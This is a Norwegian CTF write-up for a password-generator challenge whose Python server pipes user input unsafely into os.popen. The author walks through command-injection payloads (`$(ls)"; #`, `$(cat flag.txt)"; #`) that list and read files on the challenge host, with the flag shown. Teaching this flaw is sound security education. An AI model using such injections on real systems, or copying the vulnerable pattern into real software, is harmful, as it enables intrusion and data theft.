# Passord generator 500

> Passord generator
>
> Ettersom det er blitt vanskelig å lage gode passord for fremtiden så har jeg laget meg en service jeg kan ta i bruk for å generere gode passord. Hvis du vil ha et godt passord kan du godt bruke den du også!
>
> ctf.uiactf.no:5004
>
> File: `server.py`

![](00.png)

---

Her får vi presentert et Python-program som genererer passord basert på user input:

`server.py`
```python
#!/usr/bin/python3
import os

print("Velkommen til min superpassordmaskin9000v1!\n\
Gi meg en string som skal være med på å lage et nytt passord så skal jeg gi deg et skikkelig godt passord tilbake.")
print(f"String:")

input_from_client = input('> ')
sha256_output = os.popen(f'echo "{input_from_client}" | sha256sum').read()

print(f"Her er ditt gode password:\n> {''.join(sha256_output)}")
```

Vi får også oppgitt en server som kjører dette programmet. Dersom vi gir programmet `test` som input ser vi følgende:

```bash
$ echo 'test' | nc ctf.uiactf.no 5004
Velkommen til min superpassordmaskin9000v1!
Gi meg en string som skal være med på å lage et nytt passord så skal jeg gi deg et skikkelig godt passord tilbake.
String:
> Her er ditt gode password:
> f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2  -
```

Når vi ser gjennom kildekoden ser vi en `command injection`-sårbarhet:

```python
sha256_output = os.popen(f'echo "{input_from_client}" | sha256sum').read()
```

Her kjøres en kommando som tar i mot `untrusted user input`.

Vi kan bestemme hvilken kommando som kjøres på serveren alt etter hvilken input vi gir.

Ved å bruke payload `$(ls)"; #` kan vi f.eks. liste ut filene som ligger på serveren.

Payload `$(ls)"; #`:

Vi bruker `$()` for å kjøre ønsket kommando og avslutter deretter `echo`-kallet med `"; #`. Alt etter `#` behandles som en kommentar og `echo` spytter nå direkte ut resultatet av kommandoen vår.

Følgende kommando kjøres på serveren:

```bash
echo "$(ls)"; #" | sha256sum
```

Test:

```bash
$ echo '$(ls)"; #' | nc ctf.uiactf.no 5004
Velkommen til min superpassordmaskin9000v1!
Gi meg en string som skal være med på å lage et nytt passord så skal jeg gi deg et skikkelig godt passord tilbake.
String:
> Her er ditt gode password:
> flag.txt
server.py
```

Vi ser at det finnes et flagg på serveren. Nå kan vi bygge en ny payload som leser ut flagget.

Payload: `$(cat flag.txt)"; #`:

```bash
$ echo '$(cat flag.txt)"; #' | nc ctf.uiactf.no 5004
Velkommen til min superpassordmaskin9000v1!
Gi meg en string som skal være med på å lage et nytt passord så skal jeg gi deg et skikkelig godt passord tilbake.
String:
> Her er ditt gode password:
> UIACTF{opsi_dupsi_I_made_an_uuuupsi}
```

## Flagg
`UIACTF{opsi_dupsi_I_made_an_uuuupsi}`
